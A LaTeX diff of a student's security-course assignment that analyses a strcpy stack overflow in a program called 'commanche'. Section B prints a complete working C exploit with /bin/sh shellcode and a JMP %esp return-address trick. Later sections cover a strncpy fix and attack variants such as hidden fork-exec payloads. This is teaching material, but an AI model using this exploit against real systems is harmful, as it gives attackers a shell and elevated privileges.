@@ -1,0 +1,171 @@
+\documentclass{article}
+
+\usepackage{graphicx}
+\usepackage{moreverb}
+
+\author{Nic Hollingum - 308193415}
+\title{ELEC 5616 - Project 3}
+
+\addtolength{\oddsidemargin}{-.5in}
+\addtolength{\evensidemargin}{-.5in}
+\addtolength{\textwidth}{1.0in}
+\addtolength{\topmargin}{-0.5in}
+\addtolength{\textheight}{1.5in}
+
+\begin{document}
+\maketitle
+
+\section*{A}
+The code makes a call to the unsafe method {\em strcpy} without sanitising data.
+This call is vulnerable to buffer overflow, which we shall explot.
+
+Since the string is passed unchecked from the command line, this allows an attacker to inject code into the program and re-route execution to the injected code.
+Such an attack is made possible because strcpy is an unprotected method and allows us to overwrite past the normal bounds of the buffer into the stack return address
+
+\section*{B}
+
+The following code was sourced from ``http://www.win.tue.nl/~aeb/linux/hh/newsletter13.txt'' on 2/6/2011.
+It contains the shellcode and address finding routines to facilitate the exploit.
+Thanks to IZIK for proof of concept.
+
+This exploit was compiled with gcc 3.4 on atomic against a slightly modified version of commanche (without a versioin integer, for simplicity).
+This code could be modified to run with the version integer by simply increasing the size of evilbuf, the actual size increase will depend on compiler version and flags.
+
+This code uses an interesting property in order to locate and jump to the shellcode.
+We make the guess that somewhere in memory there exists a collection of bits which map to the machine instruction ``jump to the instruction pointed to by the word at the location pointed to by the stack pointer''.
+Or, ``JMP \%esp''.
+
+As it happens there is a static shared object linux-gate.so.1 which is always at a known location in memory, and is likely to contain the required bit sequence.
+Thus we look through memory around where we expect to find linux-gate.so.1, and when we find the right bits in memory we remember this.
+We will use this location to overwrite the return address.
+The machine will attempt to return from the function, read the return address and jump to a point in memory with the instruction ``JMP \%esp'', which will make it jump to the part of the stack where our shellcode sits.
+
+\begin{verbatimtab}
+/*
+ * va-exploit-poc.c, Exploiting va-vuln-poc.c 
+ * under VA patch (Proof of Concept!)
+ * - izik@tty64.org
+ * Appropriated for CNS assignment by Nic
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+char shellcode[] = 
+	"\x6a\x0b"              // push $0xb 
+	"\x58"                  // pop %eax 
+	"\x99"                  // cltd 
+	"\x52"                  // push %edx 
+	"\x68\x2f\x2f\x73\x68"  // push $0x68732f2f 
+	"\x68\x2f\x62\x69\x6e"  // push $0x6e69622f 
+	"\x89\xe3"              // mov %esp,%ebx 
+	"\x52"                  // push %edx 
+	"\x53"                  // push %ebx 
+	"\x89\xe1"              // mov %esp,%ecx 
+	"\xcd\x80";             // int $0x80 
+
+unsigned long find_esp(void) {
+        int i;
+        char *ptr = (char *) 0xffffe000;
+
+	/* Search through memorry for a chunk of ram with the right bits */
+	/* We look through this staticly linked shared object for the bits that say: */
+	/* "jump to the stack pointer" */
+        for (i = 0; i < 4095; i++) {
+
+                if (ptr[i] == '\xff' && ptr[i+1] == '\xe4') {
+			printf("* Found JMP %%ESP @ 0x%08x\n", ptr+i);
+			return (unsigned long) ptr+i;
+                }
+        }
+
+	return 0;
+}
+
+int main(int argc, char **argv) {
+
+	char evilbuf[295];
+	char *evilargs[] = { "./commanche", evilbuf , NULL };
+	unsigned long retaddr;
+
+	/* find the static memory address of the library we want to ping off */
+	retaddr = find_esp();
+	if (!retaddr) {
+		printf("* No JMP %%ESP in this kernel!\n");
+		return -1;
+	}
+
+	/* loading the weapon
+	 * Fill the buffer with some random character (in this case A)
+	 * put the return address 12 bytes beyong the end of the buffer
+	 * put the code after the return address
+	 */
+	memset(evilbuf, 0x41, sizeof(evilbuf));
+	memcpy(evilbuf+268, &retaddr, sizeof(long));
+	memcpy(evilbuf+272, shellcode, sizeof(shellcode));
+
+	execve("./commanche", evilargs, NULL);
+	return 1;
+}
+\end{verbatimtab}
+
+\section*{C}
+The use of strncpy or memcpy (if the null termination is irrelevant) is preferable since both of these methods restrict the copy size to a known quantity.
+In other words if the injection attack is attempted then the method call only copes some of the characters between buffers.
+In the case of strncopy it will copy up to the termination character or n characters, whichever comes first.
+Note that 
+\begin{verbatimtab}
+#include<stdio.h>
+#include<string.h>
+
+int
+printURL(char *myURL) {
+	int version = 2;
+	char url[256];
+	
+	strncpy(url, myURL, 255);
+	printf("Loading URL: %s\n", url);
+	
+	return 0;
+}
+
+void
+main(int argc, char **argv) {
+	printURL(argv[1]);
+}
+\end{verbatimtab}
+
+\section*{D}
+This problem specifically would not exist.
+Java does bounds checking on arrays automatically, to prevent this kind of thing.
+As it happens an equivalent java statement to strcpy is:
+\begin{verbatim} String a = b; \end{verbatim}
+
+However there are other security issues with java.
+The JVM itself is a large program with many implementations, it can be an attack vector itself, despite the many security features of java's higher level language.
+
+\section*{E}
+
+This exploit injects instructions so as to gain a command shell.
+However this is only one way of attacking.
+Another approach is to simply overwrite the return address with a known memory location of malicious code.
+That is, have some malicious code running (without privelages) and put the return address of the unprivelaged malicious code into the stack of the privelaged vulnerable code.
+This means that the process executing with privelages is now suddenly executing attack code with elevated privelage.
+This variation is more suitable for distribution on multiple architectures, since pre-knowledge of the architecture is not necessary.
+
+Another thing is to simply change the content of the injected code.
+In our exploit we spawn a shell, but another thing would be to exec malicious software, or even more subtly, fork exec malicious software.
+The advantage of the fork exec is that the user may be completely unaware of the malicious software, as we can return the vulnerable program to normal execution.
+
+\section*{F}
+
+More important.
+
+These kinds of problems allow possibly trusted systems to be subverted into malicious ones.
+It is pointless to know exactly who a connection is coming from, since that person's system may have been compromised by some kind of buffer overflow.
+Strong authentication would only prevent people from accepting connections from known malicious sources.
+However so long as buffer overflows exist, any source can be controlled by a malicious attacker, and therefore authenticate strongly despite being malicious.
+
+\end{document}
